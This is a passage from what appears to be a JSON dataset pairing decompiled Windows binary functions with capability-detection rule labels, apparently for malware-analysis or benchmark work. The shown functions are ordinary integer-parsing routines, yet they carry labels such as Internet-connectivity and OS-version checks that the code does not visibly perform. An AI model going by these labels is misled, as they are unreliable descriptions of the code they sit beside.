uVar9) {\n                    iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                    if (iVar13 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack129 = iVar13 == -1;\n                }\n                bVar21 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar21)) && (bVar21 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar13 = (**(*piStack120 + 0x48))();\n                    bVar21 = iVar13 == -1;\n                    if (bVar21) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar4;\n                if (bStack129 == bVar21) goto code_r0x000140046d45;\n                uVar6 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar7 + 0x20);\n                if ((uVar2 == 0) || (*(iVar7 + 0x49) != uVar6)) break;\ncode_r0x0001400471d7:\n                if (iVar15 == 0) {\n                    uVar18 = 0;\n                    goto code_r0x000140046d45;\n                }\n                fcn.140077ac0(aiStack80, iVar15);\n                iVar15 = 0;\n                uVar2 = uStack130;\n            }\n        }\ncode_r0x000140046f04:\n        uVar18 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140046f17;\ncode_r0x000140046d55:\n        if ((bVar19) || (iVar15 != 0)) {\ncode_r0x000140046f5b:\n            if (uVar4 == 0) {\n                if (uStack130 == 0) {\n                    uVar16 = -uVar17;\n                    if (uStack136 == '\\0') {\n                        uVar16 = uVar17;\n                    }\n                    *in_stack_00000038 = uVar16;\n                }\n                else {\n                    *in_stack_00000038 = uStack136 + 0x7fffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x000140046d84;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140046d84:\n    if (uVar18 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar15 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (iVar15 == 0) {\n        iVar15 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar15 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar15 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar15 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4423
    },
    "14004745": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140047450(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    char cVar13;\n    bool bVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar15 = 8;\ncode_r0x0001400474b8:\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x0001400474dc:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140023fd0(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar13 = *(iVar9 + 0x20);\n                if (((cVar13 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x000140047546;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140023fd0(ppiStack144);\n                    cVar13 = *(iVar9 + 0x20);\n                    goto code_r0x000140047546;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar13 = *(iVar9 + 0x20);\ncode_r0x000140047546:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar13 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x000140047573;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar16 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar16 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140047573:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x0001400475fb;\n                        }\n                        uVar5 = uVar16 == 0 || uVar15 == 0x10;\n                        if (uVar16 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x000140047612;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x0001400475d0;\ncode_r0x0001400479c8:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x0001400475d0;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x0001400479c8;\ncode_r0x0001400475d0:\n                        bVar23 = false;\n                    }\n                    bVar14 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar14) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar14;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x0001400475fb;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x000140047a10:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x000140047a10;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar13 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x0001400475fb:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x000140047806;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar16 != 8) goto code_r0x0001400474b8;\n        uVar15 = 0x10;\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x0001400474dc;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x000140047806:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x000140047612:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar9 + 0x88);\n    uVar16 = 0xffffffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            uVar17 = 0;\ncode_r0x000140047674:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x0001400478d2;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x0001400478bb;\n            uVar18 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar16 < uVar17) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar7 = uVar17 * uStack136;\n                        uVar17 = uVar18 + uVar7;\n                        uStack131 = uStack131 | CARRY4(uVar18, uVar7);\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar10 = piStack104[3];\n                    if (piStack104[2] < uVar10) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar10 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar10 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x000140047716;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x0001400478d2;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x000140047a84:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x0001400478d2;\n                    uVar18 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x000140047674;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x000140047674;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x0001400478d2;\n                cVar6 = -1;\ncode_r0x0001400478bb:\n                if (5 < cVar6 + 0x9fU) goto code_r0x000140047a84;\n                uVar18 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x0001400478d2;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x000140047716:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140047726;\ncode_r0x0001400478e5:\n        uVar20 = uVar2;\n        fcn.140077ac0(aiStack80, iVar19);\n        cVar6 = fcn.1400b15c0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140047929;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x000140047716;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x000140047b91;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar15),  iVar12 != 0))\n              ) {\n            uVar7 = iVar12 - (iVar9 + 0x72);\n            if (0xf < uVar7) {\n                uVar7 = uVar7 - 6;\n            }\n            uVar2 = uVar20;\n            if (uVar17 <= uVar16) {\n                uVar18 = uVar17 * uStack136;\n                uVar17 = uVar7 + uVar18;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | CARRY4(uVar7, uVar18);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar10 = piStack104[3];\n                if (piStack104[2] < uVar10) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar10 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar10 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x000140047716;\n                uVar7 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x000140047b91:\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x000140047716;\n                }\n                fcn.140077ac0(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x0001400478d2:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x0001400478e5;\ncode_r0x000140047726:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x000140047929:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar17 = -uVar17;\n                    }\n                    *in_stack_00000038 = uVar17;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x000140047755;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140047755:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x140102a70 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4372
    },
    "140047e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140047e10(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    char cVar12;\n    bool bVar13;\n    int32_t iVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint16_t *in_stack_00000038;\n    uint16_t uStack156;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar8 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar17 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar17 == 0x40) {\n        uVar15 = 8;\ncode_r0x000140047e78:\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x000140047e9c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140023fd0(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar8 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar8 + 0x6f) == cVar6)) {\n                cVar12 = *(iVar8 + 0x20);\n                if (((cVar12 != '\\0') && (*(iVar8 + 0x49) == cVar6)) || (*(iVar8 + 0x48) == cVar6))\n                goto code_r0x000140047f06;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140023fd0(ppiStack144);\n                    cVar12 = *(iVar8 + 0x20);\n                    goto code_r0x000140047f06;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar12 = *(iVar8 + 0x20);\ncode_r0x000140047f06:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar12 == '\\0' || (*(iVar8 + 0x49) != cVar6)) &&\n                       (*(iVar8 + 0x48) != cVar6))) {\n                    if (*(iVar8 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x000140047f33;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar17 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar17 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140047f33:\n                        if ((*(iVar8 + 0x70) != cVar6) && (*(iVar8 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140047fbb;\n                        }\n                        uVar5 = uVar17 == 0 || uVar15 == 0x10;\n                        if (uVar17 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x000140047fd2;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar9 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar9;\n                        if (uVar9 < piStack104[3]) goto code_r0x000140047f90;\ncode_r0x000140048390:\n                        uStack96 = 0xffffffff;\n                        iVar18 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar18 != -1) goto code_r0x000140047f90;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x000140048390;\ncode_r0x000140047f90:\n                        bVar23 = false;\n                    }\n                    bVar13 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar13) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar18 = (**(*piStack120 + 0x48))(),  iVar18 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar13;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x000140047fbb;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x0001400483d0:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x0001400483d0;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar12 = *(iVar8 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x000140047fbb:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x0001400481c6;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar17 != 8) goto code_r0x000140047e78;\n        uVar15 = 0x10;\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x000140047e9c;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x0001400481c6:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x000140047fd2:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar8 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar8 + 0x88);\n    uStack156 = 0xffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            iVar18 = 0;\ncode_r0x000140048034:\n            uVar16 = iVar18;\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x000140048294;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004827c;\n            iVar14 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uStack156 < iVar18) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar17 = iVar18 * uStack136;\n                        uStack131 = uStack131 | 0xffff - iVar14 < uVar17;\n                        iVar18 = uVar17 + iVar14;\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar16 = iVar18;\n                    uVar9 = piStack104[3];\n                    if (piStack104[2] < uVar9) {\n                        uVar10 = piStack104[2] + 1;\n                        piStack104[2] = uVar10;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar10 = piVar4[2];\n                        uVar9 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar9 <= uVar10) {\n                        iVar14 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar14 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar14 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar14 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar14 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x0001400480e0;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x000140048294;\n                    uVar7 = 0xffffffff;\n                    cVar6 = -1;\ncode_r0x000140048444:\n                    uVar16 = iVar18;\n                    if (5 < cVar6 + 0xbfU) goto code_r0x000140048294;\n                    iVar14 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x000140048034;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x000140048034;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x000140048294;\n                cVar6 = -1;\ncode_r0x00014004827c:\n                uVar16 = iVar18;\n                if (5 < cVar6 + 0x9fU) goto code_r0x000140048444;\n                iVar14 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x000140048294;\n            } while( true );\n        }\n        uVar16 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x0001400480e0:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x0001400480f0;\ncode_r0x0001400482a7:\n        uVar20 = uVar2;\n        fcn.140077ac0(aiStack80, iVar19);\n        cVar6 = fcn.1400b15c0(*(iVar8 + 0x10), *(iVar8 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x0001400482eb;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar16 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x0001400480e0;\n        }\n        uVar2 = *(iVar8 + 0x20);\n        uStack131 = 0;\n        iVar18 = 0;\n        if ((uVar2 != 0) && (*(iVar8 + 0x49) == uVar7)) goto code_r0x00014004855b;\n        while ((uVar16 = iVar18,  *(iVar8 + 0x48) != uVar7 && (iVar11 = sub.msvcrt.dll_memchr(),  iVar11 != 0))) {\n            iVar14 = iVar11 - (iVar8 + 0x72);\n            if (0xf < iVar14) {\n                iVar14 = iVar14 + -6;\n            }\n            uVar2 = uVar20;\n            if (uVar16 <= uStack156) {\n                iVar18 = uVar16 * uStack136 + iVar14;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | 0xffff - iVar14 < uVar16 * uStack136;\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar16 = iVar18;\n                uVar9 = piStack104[3];\n                if (piStack104[2] < uVar9) {\n                    uVar10 = piStack104[2] + 1;\n                    piStack104[2] = uVar10;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar10 = piVar4[2];\n                    uVar9 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar9 <= uVar10) {\n                    iVar14 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar14 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar14 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar14 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar14 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x0001400480e0;\n                uVar7 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar8 + 0x20);\n                if ((uVar2 == 0) || (*(iVar8 + 0x49) != uVar7)) break;\ncode_r0x00014004855b:\n                uVar16 = iVar18;\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x0001400480e0;\n                }\n                fcn.140077ac0(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x000140048294:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x0001400482a7;\ncode_r0x0001400480f0:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x0001400482eb:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar16 = -uVar16;\n                    }\n                    *in_stack_00000038 = uVar16;\n                }\n                else {\n                    *in_stack_00000038 = 0xffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x000140048120;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140048120:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x140102a70 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, 